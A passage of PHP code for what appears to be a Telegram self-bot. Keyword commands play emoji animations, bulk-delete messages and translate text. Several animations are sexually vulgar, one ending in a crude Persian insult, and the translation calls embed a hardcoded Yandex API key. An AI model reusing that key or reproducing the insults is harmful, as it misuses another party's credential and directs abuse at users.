                            yield $this->messages->forwardMessages(['from_peer' => "@pawnfosh", 'to_peer' => $peer, 'id' => [$rand],]);
                        }
                    }


                    if ($text == 'bk' or $text == 'بکیرم') {
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => '
😐😐😐
😐         😐
😐           😐
😐        😐
😐😐😐
😐         😐
😐           😐
😐           😐
😐        😐
😐😐😐']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '
😂         😂
😂       😂
😂     😂
😂   😂
😂😂
😂   😂
😂      😂
😂        😂
😂          😂
😂            😂']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '
😂😂😂          😂         😂
😂         😂      😂       😂
😂           😂    😂     😂
😂        😂       😂   😂
😂😂😂          😂😂
😂         😂      😂   😂
😂           😂    😂      😂
😂           😂    😂        😂
😂        😂       😂          😂
😂😂😂          😂            😂']);


                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '
🖕🖕🖕          🖕         🖕
🖕         🖕      🖕       🖕
🖕           🖕    🖕     🖕
🖕        🖕       🖕   🖕
🖕🖕🖕          🖕🖕
🖕         🖕      🖕   🖕
🖕           🖕    🖕      🖕
🖕           🖕    🖕        🖕
🖕        🖕       🖕          🖕
 🖕🖕🖕          🖕            🖕']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '
❤️❤️❤️          ❤️         ❤️
❤️         ❤️      ❤️       ❤️
❤️           ❤️    ❤️     ❤️
❤️        ❤️       ❤️   ❤️
❤️❤️❤️          ❤️❤️
❤️         ❤️      ❤️   ❤️
❤️           ❤️    ❤️      ❤️
❤️           ❤️    ❤️        ❤️
❤️        ❤️       ❤️          ❤️
 ❤️❤️❤️          ❤️            ❤️']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '
🥀🥀🥀          🥀         🥀
🥀         🥀      🥀       🥀
🥀           🥀    🥀     🥀
🥀        🥀       🥀   🥀
🥀🥀🥀          🥀🥀
🥀         🥀      🥀   🥀
🥀           🥀    🥀      🥀
🥀           🥀    🥀        🥀
🥀        🥀       🥀          🥀
 🥀🥀🥀          🥀            🥀']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '
😱😱😱          😎         😎
😱         😱      😎       😎
😱           😱    😎     😎
😱        😱       😎   😎
😱😱😱          😎😎
😱         😱      😎   😎
😱           😱    😎      😎
😱           😱    😎        😎
😱        😱       😎          😎
😱😱😱          😎            😎']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '
👿👿👿          😈         😈
👿         👿      😈       😈
👿           👿    😈     😈
👿        👿       😈   😈
👿👿👿          😈😈
👿         👿      😈   😈
👿           👿    😈      😈
👿           👿    😈        😈
👿        👿       😈          😈
👿👿👿          😈            😈']);


                    }


                    if ($text == 'ساک' or $text == 'suck') {
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => '🗣 <=====']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🗣<=====']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🗣=====']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🗣====']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🗣===']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🗣==']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🗣===']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🗣====']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🗣=====']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🗣<=====']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '<=====']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '💦💦<=====']);

                    }

                    if ($text == 'جق' or $text == 'jaq') {
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => 'درحال جق....']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '👌🏻<=====']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '<👌🏻=====']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '<=👌🏻====']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '<==👌🏻===']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '<===👌🏻==']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '<==👌🏻===']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '<=👌🏻====']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '<👌🏻=====']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '👌🏻<=====']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '<=👌🏻====']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '<===👌🏻==']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '<=👌🏻====']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '👌🏻<=====']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '<=👌🏻====']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '<==👌🏻===']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '<=👌🏻====']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '👌🏻<=====']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '💦💦<=====']);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => 'پایان جق']);
                    }
                    if (stripos($text, 'clean ') === 0) {
                        if (!isset($update['message']['reply_to']['reply_to_msg_id'])) {
                            $del = str_replace('clean ', '', $text);
                            if (is_numeric($del)) {
                                for ($i = $msg_id - 1; $i >= $msg_id - 1 - $del; $i--) {
                                    if (in_array($type3, ['channel', 'supergroup'])) {
                                        yield $this->channels->deleteMessages(['channel' => $peer, 'id' => [$i]]);
                                    } else {
                                        yield $this->messages->deleteMessages(['revoke' => true, 'id' => [$i]]);
                                    }
                                }
                                yield $this->messages->sendMessage(['peer' => $peer, 'message' => "● پاکسازی به طور کامل انجام شد تعداد : $del پیام حذف شدند"]);
                            } else {
                                yield $this->messages->sendMessage(['peer' => $peer, 'message' => "● ERROR ❌ use number for delete"]);
                            }
                        }
                    }
                    if (strpos($text, "ترجمه ") !== false) {
                        $word = trim(str_replace("ترجمه ", "", $text));
                        $gmsg = $update['message']['reply_to']['reply_to_msg_id'] ?? 0;
                        if (in_array($type3, ['channel', 'supergroup'])) {
                            $sath = yield $this->channels->getMessages(['channel' => $peer, 'id' => [$gmsg]]);
                        } else {
                            $sath = yield $this->messages->getMessages(['id' => [$gmsg]]);
                        }
                        if (isset($update['message']['reply_to']['reply_to_msg_id'])) {
                            $messag1 = $sath['messages'][0]['message'];
                            $messag = str_replace(" ", "+", $messag1);
                            if ($word == "فارسی") {
                                $url = "https://translate.yandex.net/api/v1.5/tr.json/translate?key=trnsl.1.1.20160119T111342Z.fd6bf13b3590838f.6ce9d8cca4672f0ed24f649c1b502789c9f4687a&format=plain&lang=fa&text=$messag";
                                $jsurl = json_decode(yield $this->fileGetContents($url), true);
                                $text9 = $jsurl['text'][0];
                                yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => 'ᴛʀᴀɴsʟᴀᴛᴇ ғᴀ :`' . $text9 . '`', 'parse_mode' => 'MarkDown']);
                            }
                            if ($word == "انگلیسی") {
                                $url = "https://translate.yandex.net/api/v1.5/tr.json/translate?key=trnsl.1.1.20160119T111342Z.fd6bf13b3590838f.6ce9d8cca4672f0ed24f649c1b502789c9f4687a&format=plain&lang=en&text=$messag";
                                $jsurl = json_decode(yield $this->fileGetContents($url), true);
                                $text9 = $jsurl['text'][0];
                                yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => ' ᴛʀᴀɴsʟᴀᴛᴇ ᴇɴ : `' . $text9 . '`', 'parse_mode' => 'MarkDown']);
                            }
                            if ($word == "عربی") {
                                $url = "https://translate.yandex.net/api/v1.5/tr.json/translate?key=trnsl.1.1.20160119T111342Z.fd6bf13b3590838f.6ce9d8cca4672f0ed24f649c1b502789c9f4687a&format=plain&lang=ar&text=$messag";
                                $jsurl = json_decode(yield $this->fileGetContents($url), true);
                                $text9 = $jsurl['text'][0];
                                yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => ' ᴛʀᴀɴsʟᴀᴛᴇ ᴀʀ :`' . $text9 . '`', 'parse_mode' => 'MarkDown']);
                            }
                        }
                    }

                    if ($text == 'قلب' or $text == 'ghalb') {
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => '❤️🧡💛💚']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '💚❤🧡💛']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '💛💚❤🧡']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🧡💛💚❤']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '❤🧡💛💚']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '💚❤🧡💛']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '💛💚❤🧡']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🧡💛💚❤']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '❤🧡💛💚']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '💚❤️🧡💛']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '💛💚❤🧡']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🧡💛💚❤']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '❤🧡💛💚']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '💚❤🧡💛']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '💛💚❤🧡']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🧡💛💚❤']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '❤🧡💛💚']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '💚❤🧡💛']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '💛💚❤🧡']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🧡💛💚❤']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '❤🧡💛💚']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '💚❤️🧡💛']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '💛💚❤🧡']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🧡💛💚❤']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '👾ᴇᴢ ᴇᴢ ᴛᴀᴍᴀᴍ ᴛᴀᴍᴀᴍ👾']);
                    }


                    if ($text == 'مرغ') {
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => '🥚________________🐔']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🥚_______________🐔']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🥚______________🐔']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🥚_____________🐔']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🥚____________🐔']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🥚___________🐔']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🥚__________🐔']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🥚_________🐔']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🥚________🐔']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🥚_______🐔']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🥚______🐔']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🥚____🐔']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🥚___🐔']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🥚__🐔']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🥚_🐔']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🐣🐔']);
                    }

                    if ($text == 'ابر') {
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => '⚡️________________☁️']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '⚡️_______________☁️']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '⚡️______________☁️']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '⚡️_____________☁️']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '⚡️____________☁️']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '⚡️___________☁️']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '⚡️__________☁️']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '⚡️_________☁️']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '⚡️________☁️']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '⚡️_______☁️']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '⚡️______☁️']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '⚡️____☁️']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '⚡️___☁️']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '⚡️__☁️']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '⚡️_☁️']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🌩']);
                    }
                    if ($text == 'بدو') {
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => '🏁________________🏃‍♂']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🏁_______________🏃‍♂']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🏁______________🏃‍♂']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🏁_____________🏃‍♂']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🏁____________🏃‍♂']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🏁___________🏃‍♂']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🏁__________🏃‍♂']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🏁_________🏃‍♂']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🏁________🏃‍♂']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🏁_______🏃‍♂']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🏁______🏃‍♂']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🏁____🏃‍♂']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🏁___🏃‍♂']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🏁__🏃‍♂']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🏁_🏃‍♂']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🧍‍♂🏁']);
                    }

                    if ($text == 'عشق دو' or $text == 'love4') {
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => '🚶‍♀________________🏃‍♂']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🚶‍♀_______________🏃‍♂']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🚶‍♀______________🏃‍♂']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🚶‍♀_____________🏃‍♂']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🚶‍♀____________🏃‍♂']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🚶‍♀___________🏃‍♂']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🚶‍♀__________🏃‍♂']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🚶‍♀_________🏃‍♂']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🚶‍♀________🏃‍♂']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🚶‍♀_______🏃‍♂']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🚶‍♀______🏃‍♂']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🚶‍♀____🏃‍♂']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🚶‍♀___🏃‍♂']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🚶‍♀__🏃‍♂']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🚶‍♀_🏃‍♂']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '💙𝙸 𝙻𝙾𝚅𝙴 𝚈𝙾𝚄💙']);
                    }
                    if ($text == 'موتور' or $text == 'motor') {
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => '🧲________________🏍']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🧲_______________🏍']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🧲______________🏍']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🧲_____________🏍']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🧲____________🏍']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🧲___________🏍']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🧲__________🏍']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🧲_________🏍']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🧲________🏍']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🧲_______🏍']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🧲______🏍']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🧲____🏍']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🧲___🏍']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🧲__🏍']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🧲🏍']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '💥  βøøʍ  💥']);
                    }


                    if ($text == 'ماشین' or $text == 'car') {
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => '💣________________🏎']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '💣_______________🏎']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '💣______________🏎']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '💣_____________🏎']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '💣____________🏎']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '💣___________🏎']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '💣__________🏎']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '💣_________🏎']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '💣________🏎']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '💣_______🏎']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '💣______🏎']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '💣____🏎']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '💣___🏎']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '💣__🏎']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '💣_🏎']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '💥 PooF 💥']);
                    }

                    if ($text == 'kir' or $text == 'کیر') {
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => '
🔥         🔥
🔥      🔥
🔥   🔥
🔥🔥
🔥   🔥
🔥      🔥
🔥         🔥']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '
🌟
🌟
🌟
🌟
🌟
🌟
🌟']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '
🎲🎲🎲
🎲        🎲
🎲        🎲
🎲🎲🎲
🎲   🎲
🎲      🎲
🎲        🎲']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '
🔥         🔥
🔥      🔥
🔥   🔥
🔥🔥
🔥   🔥
🔥      🔥
🔥         🔥
----------------------
🌟
🌟
🌟
🌟
🌟
🌟
🌟
----------------------
🎲🎲🎲
🎲        🎲
🎲        🎲
🎲🎲🎲
🎲   🎲
🎲      🎲
🎲        🎲
----------------------
عی کیر😂😂']);

                    }

                    if ($text == 'کیرکوبص' or $text == 'kir2') {
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => '💩💩💩
💩💩💩
🖕🖕🖕
💥💥💥']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '😂💩🖕
🖕😐🖕
 😂🖕😂
💩💩💩']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '😐💩😐
💩😂🖕
💥💩💥
🖕🖕😐']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🤤🖕😐
😏🖕😏
💩💥💩
💩🖕😂']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '💩💩💩
🤤🤤🤤
💩👽💩
💩😐💩']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '😐🖕💩
💩💥💩
💩🖕💩
💩💔😐']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '💩💩🖕💩
😐🖕😐🖕
💩🤤🖕🤤
🖕😐💥💩']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '💥😐🖕💥
💥💩💩💥
👙👙💩💥
💩💔💩👙']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '💩👙💥🖕
💩💥🖕💩
👙💥🖕💥
💩😐👙🖕
💥💩💥💩']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '💩😐🖕💩
💩🖕💥
👙🖕💥
👙🖕💥
💩💥🖕
😂👙🖕
💩💥👙']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🤤😂🖕👙
😏🖕💥👙🖕🖕
😂🖕👙💥😂🖕
😂🖕👙🖕😂🖕
💔🖕🖕🖕🖕🖕
💩💩💩💩
💩👙💩👙']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🤫👙💩😂
💩🖕💩👙💥💥
💩💩💩💩💩💩
💩😐💩😐💩😐
😃💩😃😃💩💩
🤤💩🤤💩🤤💩
💩👙💩😐🖕💩']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '💩🖕💥👙💥
💩👙💥🖕💥👙
👙🖕💥💩💩💥
👙🖕💥💩💥😂
💩💥👙🖕💩🖕
💩👙💥🖕💥😂
💩👙💥🖕']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '💩👙💥👙👙
💩👙💥🖕💩😂
💩👙💥🖕💥👙
💩👙💥🖕💩👙
💩👙💥🖕😂😂
💩👙💥🖕😂😂
💩👙💥🖕']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '💩💩💩💩💩']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '|همش تو کص ننه بدخواه😂🖕|']);

                    }

                    if ($text == 'مکعب' or $text == 'mr1') {
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => '🟥🟥🟥🟥
🟥🟥🟥🟥
🟥🟥🟥🟥
🟥🟥🟥🟥']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🟥🟥🟥🟥
🟥⬜️⬛️🟥
🟥⬛️⬜️🟥
🟥🟥🟥🟥']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🟥🟥🟥🟥
🟥⬛️⬜️🟥
🟥⬜️⬛️🟥
🟥🟥🟥🟥']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🟥🟥🟥⬛️
🟥⬜️⬛️🟥
🟥⬛️⬜️🟥
⬛️🟥🟥🟥']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🟥⬜️⬛️🟥
🟥⬛️⬜️🟥
🟥⬜️⬛️🟥
🟥⬛️⬜️🟥']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🟥⬛️⬜️🟥
🟥⬜️⬛️🟥
🟥⬛️⬜️🟥
🟥⬜️⬛️🟥']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '⬜️⬛️⬜️⬛️
⬛️⬜️⬛️⬜️
⬜️⬛️⬜️⬛️
⬛️⬜️⬛️⬜️']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '⬛️⬜️⬛️⬜️
⬜️⬛️⬜️⬛️
⬛️⬜️⬛️⬜️
⬜️⬛️⬜️⬛️']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🟥⬜️⬛️⬜️🟥
🟥⬛️⬜️⬛️🟥
🟥⬜️⬛️⬜️🟥
🟥⬛️⬜️⬛️🟥
🟥⬜️⬛️⬜️🟥']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🟥🟥🟥🟥🟥🟥🟥
🟥🟨🟨🟨🟨🟨🟥
🟥🟩🟩🟩🟩🟩🟥
🟥⬛️⬛️⬛️⬛️⬛️🟥
🟥🟦🟦🟦🟦🟦🟥
🟥⬜️⬜️⬜️⬜️⬜️🟥
🟥🟥🟥🟥🟥🟥🟥']);

